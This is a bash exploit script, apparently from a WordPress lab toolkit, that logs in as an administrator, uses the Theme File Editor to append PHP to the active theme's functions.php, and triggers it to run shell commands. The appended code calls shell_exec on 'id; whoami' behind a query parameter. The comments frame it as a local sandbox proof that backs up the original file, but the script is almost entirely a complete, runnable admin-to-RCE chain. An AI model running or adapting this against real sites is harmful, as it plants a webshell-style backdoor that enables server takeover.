#!/usr/bin/env bash
# Admin -> RCE chain #2: use wp-admin/theme-editor.php (the built-in Theme File
# Editor) to append PHP to the active theme's functions.php, then trigger it.
#
# This path needs no uploads or plugin installs: only the edit_themes
# capability, which administrators have whenever DISALLOW_FILE_EDIT is false.
set -euo pipefail

# shellcheck source=./common.sh
source "$(dirname "$0")/common.sh"

THEME="${THEME:-twentytwentyfive}"
THEME_FILE="${THEME_FILE:-functions.php}"
EDITOR_URL="$BASE_URL/wp-admin/theme-editor.php?file=$THEME_FILE&theme=$THEME"

echo "[*] target: $BASE_URL (theme: $THEME, file: $THEME_FILE)"

wp_login "$TMP_DIR/dashboard.html"

# 1. Load the editor for the target file and read its nonce + current content.
curl -sS --max-time 30 -b "$COOKIE_JAR" -c "$COOKIE_JAR" \
  "$EDITOR_URL" -o "$TMP_DIR/editor.html"

EDIT_NONCE="$(nonce "$TMP_DIR/editor.html" nonce)"

python3 - "$TMP_DIR/editor.html" "$TMP_DIR/newcontent.php" "$LAB_DIR/backup-functions.php.orig" <<'PY'
import html, os, re, sys

page = open(sys.argv[1], encoding="utf-8", errors="replace").read()
match = re.search(r'<textarea[^>]*id="newcontent"[^>]*>(.*?)</textarea>', page, re.S)
if not match:
    sys.exit("could not read newcontent textarea")

content = html.unescape(match.group(1))
if not os.path.exists(sys.argv[3]):
    open(sys.argv[3], "w", encoding="utf-8").write(content)
    print("saved original to", sys.argv[3])
payload = """

/* Lab: theme-editor code execution proof (local sandbox only). */
if ( isset( $_GET['theme_rce'] ) && current_user_can( 'manage_options' ) ) {
\theader( 'Content-Type: text/plain; charset=utf-8' );
\techo "theme-editor RCE\\n" . shell_exec( 'id; whoami' );
\texit;
}
"""
if "theme_rce" in content:
    for marker in ("/* Lab: theme-editor code execution proof", "/* lab */"):
        if marker in content:
            content = content.split(marker, 1)[0].rstrip() + "\n"
            break
open(sys.argv[2], "w", encoding="utf-8").write(content + payload)
print("prepared functions.php payload")
PY

# 2. Save the modified file through the admin form. WordPress answers with a
#    302 redirect to theme-editor.php?a=1, so follow it to see the confirmation.
curl -sS --max-time 45 -b "$COOKIE_JAR" -c "$COOKIE_JAR" -L \
  --data-urlencode "nonce=$EDIT_NONCE" \
  --data-urlencode "_wp_http_referer=/wp-admin/theme-editor.php?file=$THEME_FILE&theme=$THEME" \
  --data-urlencode "theme=$THEME" \
  --data-urlencode "file=$THEME_FILE" \
  --data-urlencode "action=update" \
  --data-urlencode "submit=Update File" \
  --data-urlencode "newcontent@$TMP_DIR/newcontent.php" \
  -o "$TMP_DIR/save.html" \
  "$BASE_URL/wp-admin/theme-editor.php"

if grep -qiE 'Unable to communicate|not writable|File is not editable|Sorry, that file cannot be edited' "$TMP_DIR/save.html"; then
  fail "theme editor refused the write (DISALLOW_FILE_EDIT / permissions?)"
fi
grep -qi 'File edited successfully' "$TMP_DIR/save.html" || fail "theme editor did not confirm the save"
echo "[+] functions.php overwritten through wp-admin/theme-editor.php"

# 3. Trigger the injected code on the front end.
RESULT="$(curl -sS --max-time 30 -b "$COOKIE_JAR" -w '\nHTTP_STATUS:%{http_code}' "$BASE_URL/?theme_rce=1")"
printf '%s\n' "$RESULT" | sed -n '1,/HTTP_STATUS:/p'

grep -q 'uid=' <<<"$RESULT" || fail "injected theme code did not execute"
echo
echo "[+] RCE CONFIRMED via the Theme File Editor."
